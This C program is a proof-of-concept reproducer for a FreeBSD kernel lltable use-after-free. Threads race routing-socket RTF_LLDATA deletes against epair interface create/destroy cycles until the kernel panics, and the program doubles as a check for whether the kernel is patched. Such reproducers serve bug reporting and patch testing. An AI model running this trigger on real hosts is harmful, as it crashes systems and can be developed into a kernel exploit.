/*
 * lltable-detach-uaf.c - minimal reproducer for the in_ifdetach() /
 * in6_ifdeparture() lltable use-after-free.
 *
 * The bug: a routing-socket RTM_DELETE carrying RTF_LLDATA is handled by
 * lla_rt_output() (sys/net/rtsock.c), which looks the interface up by index
 * with ifnet_byindex() and then locks its lltable in lltable_delete_addr()
 * (sys/net/if_llatbl.c).  All of this runs inside the net epoch.  But
 * in_ifdetach() (sys/netinet/in.c) and in6_ifdeparture()
 * (sys/netinet6/in6_ifattach.c) free that lltable during interface teardown
 * WITHOUT a NET_EPOCH_WAIT(), while the ifnet is still reachable by index.
 * A delete racing a destroy therefore locks freed memory.
 *
 * This program is the whole race, no FRR involved: hammer threads blast
 * RTF_LLDATA deletes (one IPv4, one IPv6) at a victim interface index while
 * the main thread creates and destroys that interface in a loop.
 *
 * On an unpatched FreeBSD 16-CURRENT GENERIC kernel (VIMAGE + INVARIANTS)
 * this panics within seconds, typically a page fault in LLTABLE_LOCK() under
 * lltable_delete_addr() <- lla_rt_output() <- rts_send().  WILL PANIC THE
 * MACHINE: run only on a disposable host or VM, as root.
 *
 *   cc -O2 -Wall -o lltable-detach-uaf lltable-detach-uaf.c -lpthread
 *   ./lltable-detach-uaf [seconds]        # default 60
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <net/if_dl.h>
#include <net/route.h>
#include <netinet/in.h>

#include <err.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define HAMMER_THREADS	4
#define SA_RND(len)	(1 + (((len) - 1) | (sizeof(long) - 1)))	/* SA_SIZE */

static volatile unsigned int	victim_idx;	/* ifindex to attack, 0 == none */
static volatile int		stop;

/*
 * Build and send one RTM_DELETE | RTF_LLDATA message.  dst is the L3 address
 * (sockaddr_in or sockaddr_in6); gw is a sockaddr_dl naming the interface by
 * index.  This is exactly the shape lla_rt_output() decodes.
 */
static void
send_lldata_delete(int s, unsigned int idx, int af)
{
	char buf[512];
	struct rt_msghdr *rtm = (struct rt_msghdr *)buf;
	char *cp = buf + sizeof(*rtm);
	size_t dstlen, gwlen;

	memset(buf, 0, sizeof(buf));

	if (af == AF_INET) {
		struct sockaddr_in sin;
		memset(&sin, 0, sizeof(sin));
		sin.sin_len = sizeof(sin);
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = htonl(0x0a0a0a0aU);	/* 10.10.10.10 */
		dstlen = SA_RND(sin.sin_len);
		memcpy(cp, &sin, sizeof(sin));
	} else {
		struct sockaddr_in6 sin6;
		memset(&sin6, 0, sizeof(sin6));
		sin6.sin6_len = sizeof(sin6);
		sin6.sin6_family = AF_INET6;
		sin6.sin6_addr.s6_addr[0] = 0xfd;		/* fd00::1 */
		sin6.sin6_addr.s6_addr[15] = 0x01;
		dstlen = SA_RND(sin6.sin6_len);
		memcpy(cp, &sin6, sizeof(sin6));
	}
	cp += dstlen;

	struct sockaddr_dl sdl;
	memset(&sdl, 0, sizeof(sdl));
	sdl.sdl_len = sizeof(sdl);
	sdl.sdl_family = AF_LINK;
	sdl.sdl_index = idx;
	gwlen = SA_RND(sdl.sdl_len);
	memcpy(cp, &sdl, sizeof(sdl));
	cp += gwlen;

	rtm->rtm_msglen = cp - buf;
	rtm->rtm_version = RTM_VERSION;
	rtm->rtm_type = RTM_DELETE;
	rtm->rtm_flags = RTF_LLDATA | RTF_HOST;
	rtm->rtm_addrs = RTA_DST | RTA_GATEWAY;
	rtm->rtm_pid = getpid();
	rtm->rtm_seq = 1;

	(void)write(s, buf, rtm->rtm_msglen);	/* errors expected, ignore */
}

static void *
hammer(void *arg __attribute__((unused)))
{
	int s = socket(PF_ROUTE, SOCK_RAW, 0);
	if (s < 0)
		err(1, "socket(PF_ROUTE)");
	while (!stop) {
		unsigned int idx = victim_idx;
		if (idx != 0) {
			send_lldata_delete(s, idx, AF_INET);
			send_lldata_delete(s, idx, AF_INET6);
		}
	}
	close(s);
	return (NULL);
}

/* ifconfig epair create / destroy via ioctl, returns ifindex of epairNa. */
static unsigned int
epair_create(int s, char name[IFNAMSIZ])
{
	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strlcpy(ifr.ifr_name, "epair", sizeof(ifr.ifr_name));
	if (ioctl(s, SIOCIFCREATE2, &ifr) < 0)
		err(1, "SIOCIFCREATE2 epair");
	strlcpy(name, ifr.ifr_name, IFNAMSIZ);	/* kernel fills epairNa */
	return (if_nametoindex(name));
}

static void
epair_destroy(int s, const char *name)
{
	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strlcpy(ifr.ifr_name, name, sizeof(ifr.ifr_name));
	(void)ioctl(s, SIOCIFDESTROY, &ifr);	/* may already be gone */
}

int
main(int argc, char **argv)
{
	int seconds = (argc > 1) ? atoi(argv[1]) : 60;
	pthread_t th[HAMMER_THREADS];

	if (geteuid() != 0)
		errx(1, "must be root");

	int ctl = socket(AF_INET, SOCK_DGRAM, 0);
	if (ctl < 0)
		err(1, "socket(AF_INET)");

	for (int i = 0; i < HAMMER_THREADS; i++)
		if (pthread_create(&th[i], NULL, hammer, NULL) != 0)
			errx(1, "pthread_create");

	printf("hammering RTF_LLDATA deletes vs epair destroy for %ds "
	    "(expect panic)...\n", seconds);
	fflush(stdout);

	time_t end = time(NULL) + seconds;
	unsigned long iters = 0;
	while (time(NULL) < end) {
		char name[IFNAMSIZ];
		unsigned int idx = epair_create(ctl, name);
		victim_idx = idx;		/* open the window */
		epair_destroy(ctl, name);	/* free the lltable under us */
		victim_idx = 0;
		iters++;
	}

	stop = 1;
	for (int i = 0; i < HAMMER_THREADS; i++)
		pthread_join(th[i], NULL);
	close(ctl);
	printf("survived %lu create/destroy cycles: kernel looks patched\n",
	    iters);
	return (0);
}
